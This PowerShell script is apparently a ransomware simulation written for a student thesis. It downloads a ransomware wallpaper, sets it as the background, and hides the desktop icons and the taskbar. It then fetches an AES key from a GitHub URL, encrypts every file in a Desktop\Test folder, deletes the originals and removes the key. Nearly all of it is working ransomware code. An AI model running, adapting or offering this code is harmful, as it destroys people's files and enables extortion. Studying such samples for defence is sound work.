Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@



Function Protect-File
{

[CmdletBinding(DefaultParameterSetName='SecureString')]
[OutputType([System.IO.FileInfo[]])]
Param(
    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('PSPath','LiteralPath')]
    [string[]]$FileName,
    [Parameter(Mandatory=$false, Position=2)]
    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
    [String]$Algorithm = 'AES',
    [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')]
    [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm),
    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
    [String]$KeyAsPlainText,
    [Parameter(Mandatory=$false, Position=4)]
    [System.Security.Cryptography.CipherMode]$CipherMode,
    [Parameter(Mandatory=$false, Position=5)]
    [System.Security.Cryptography.PaddingMode]$PaddingMode,
    [Parameter(Mandatory=$false, Position=6)]
    [String]$Suffix = ".$Algorithm",
    [Parameter()]
    [Switch]$RemoveSource
)
    Begin
    {
        #Configure cryptography
        try
        {
            if($PSCmdlet.ParameterSetName -eq 'PlainText')
            {
                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
            }

            #Decrypt cryptography Key from SecureString
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))

            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
            if($PSBoundParameters.ContainsKey('CipherMode')){
                $Crypto.Mode = $CipherMode
            }
            if($PSBoundParameters.ContainsKey('PaddingMode')){
                $Crypto.Padding = $PaddingMode
            }
            $Crypto.KeySize = $EncryptionKey.Length*8
            $Crypto.Key = $EncryptionKey
        }
        Catch
        {
            Write-Error $_ -ErrorAction Stop
        }
    }
    Process
    {
        $Files = Get-Item -LiteralPath $FileName
    
        ForEach($File in $Files)
        {
            $DestinationFile = $File.FullName + $Suffix

            Try
            {
                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)

                #Write IV (initialization-vector) length & IV to encrypted file
                $Crypto.GenerateIV()
                $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
                $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)

                #Perform encryption
                $Transform = $Crypto.CreateEncryptor()
                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
                $FileStreamReader.CopyTo($CryptoStream)
    
                #Close open files
                $CryptoStream.FlushFinalBlock()
                $CryptoStream.Close()
                $FileStreamReader.Close()
                $FileStreamWriter.Close()

                #Delete unencrypted file
                if($RemoveSource){Remove-Item -LiteralPath $File.FullName}

                #Output ecrypted file
                $result = Get-Item $DestinationFile
                
            }
            Catch
            {
                Write-Error $_
                If($FileStreamWriter)
                {
                    #Remove failed file
                    $FileStreamWriter.Close()
                    Remove-Item -LiteralPath $DestinationFile -Force
                }
                Continue
            }
            Finally
            {
                if($CryptoStream){$CryptoStream.Close()}
                if($FileStreamReader){$FileStreamReader.Close()}
                if($FileStreamWriter){$FileStreamWriter.Close()}
            }
        }
    }
}

Export-ModuleMember -Function Protect-File


Try{

Start-Transcript -Path "C:\Users\ionut\Downloads\logs.txt"

# Descarca imaginea
$imageUrl = "https://www.smartpcuser.com/wp-content/uploads/2020/07/wholocked-ransomware-wallpaper.png" 
$outputPath = "C:\Users\ionut\Downloads\image.jpg" 
Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath 
Write-Output "Image downloaded successfully to $outputPath"

# Minimizeaza toate aplicatiile care ruleaza
$shell = New-Object -ComObject Shell.Application
$shell.MinimizeAll()

# Seteaza imaginea descarcata ca desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "C:\Users\ionut\Downloads\image.jpg" , 3)

# Ascunde icons de pe desktop
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 1


# Restart Explorer
Stop-Process -ProcessName explorer -Force
Start-Process explorer

# Inchide noua instanta de Windows Explorer
$wex = New-Object -ComObject wscript.shell;
Sleep 3
$wex.SendKeys('%{F4}')
Sleep 2

# Ascunde taskbar
$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)

# Define the URL of the file to download
$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/secret.xml"

# Define the path where the file will be saved
$outputPath = "C:\Users\ionut\Downloads\secret.xml"

# Download the file
Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
# Define the path to the certificate and the password
$secretPath = "C:\Users\ionut\Downloads\secret.xml"

#secretKey
$key = Import-CliXml -Path C:\Users\ionut\Downloads\secret.xml

$files = Get-ChildItem "C:\Users\ionut\Desktop\Test"

#Protect-File "C:\Users\ionut\Desktop\Test\test1.txt" -Algorithm AES -Key $key -RemoveSource 

for ($i=0; $i -lt $files.Count; $i++) {
    $outfile = $files[$i].FullName
    Protect-File $outfile -Algorithm AES -Key $key -RemoveSource 
}

Remove-Item -Path C:\Users\ionut\Downloads\secret.xml

Stop-Transcript

}

Catch {"Scriptul a returnat eroare"}



